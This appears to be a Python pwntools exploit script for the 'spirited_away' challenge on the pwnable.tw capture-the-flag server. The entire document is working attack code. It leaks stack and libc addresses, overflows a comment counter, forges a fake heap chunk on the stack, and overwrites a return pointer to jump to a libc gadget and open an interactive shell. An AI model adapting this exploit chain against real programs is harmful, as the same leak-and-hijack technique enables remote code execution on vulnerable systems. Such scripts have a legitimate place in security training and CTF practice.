from pwn import *
def note(name, age, why, comment, option, choice):
    if(option!=2):
        print("GOOD")
        s.recvuntil("name: ")
        s.send(name)
        s.recvuntil("age: ")
        s.send(str(age)+"\n")
        s.recvuntil("movie? ")
        s.send(why)
        s.recvuntil("comment: ")
        s.send(comment)
        a=s.recvuntil("<y/n>: ")
        #print(a)
        if(option==1):
            print(hexdump(a))
            stack_leak=u32(a[0x56:0x5a])
            heap_leak=u32(a[0x5e:0x62])
            s.send(choice+"\n")
            return (stack_leak, heap_leak)
        else:
            s.send(choice+"\n")
    elif(option==2):
        print(str(age))
        s.recvuntil("age: ")
        s.send(str(age)+"\n")
        s.recvuntil("movie? ")
        s.send(why)
        a=s.recvuntil("<y/n>: ")
        #print(a)
        s.send(choice+"\n")

s=remote("chall.pwnable.tw",10204)
#s=process("./spirited_away", env={"LD_PRELOAD":"./libc_32.so.6"})
#s=process("./spirited_away")

(stack_leak, heap_leak)=note("heeyeon", 23, "a"*56, "YEAH", 1, 'y')
stack_leak1=stack_leak-0xbf8433b8+0xbf843358
stack_leak2=stack_leak-0xbf8433b8+0xbf843358-8-8
print(hex(heap_leak))
heap_leak=heap_leak-0xb7e5d33b+0xb7e3a940
#heap_leak=heap_leak-0xb7d88e6b+0xb7d65da0
print(hex(heap_leak))
print(hex(stack_leak))
for i in range(9):
    note("heeyeon\n", i, "a", "b", 0, 'y')
for i in range(10, 100):
    note("heeyeon\n", i, "a", "b", 2, 'y')

comment="k"*0x50
comment+="bbbb"+p32(stack_leak1)
why="c"*12+p32(0x40)+p32(0)*15+p32(0x123)
note("yoonsu", 100, why, comment, 3, 'y')

print(s.recvuntil("name: "))
#s.send("h"*(64)+p32(stack_leak)+p32(heap_leak)+p32(0)+p32(heap_leak-0xb7e5b940+0xb7f79e8b-0xb7e6f2eb+0xb7e71a0b))
s.send("h"*(64)+p32(stack_leak)+p32(heap_leak)+p32(0)+p32(heap_leak-0xb7e5b940+0xb7f79e8b-0xb7e6f2eb+0xb7e71a0b-0xb7ece5ab+0xb7ecbe8b))
print(s.recvuntil("age: "))
s.send(str(101)+"\n")
print(s.recvuntil("movie? "))
s.send(why)
print(s.recvuntil("comment: "))
s.send("a")
print(s.recvuntil("<y/n>: "))
pause()
s.send("n\n")
print(s.recv(1024))

s.interactive()
s.close()
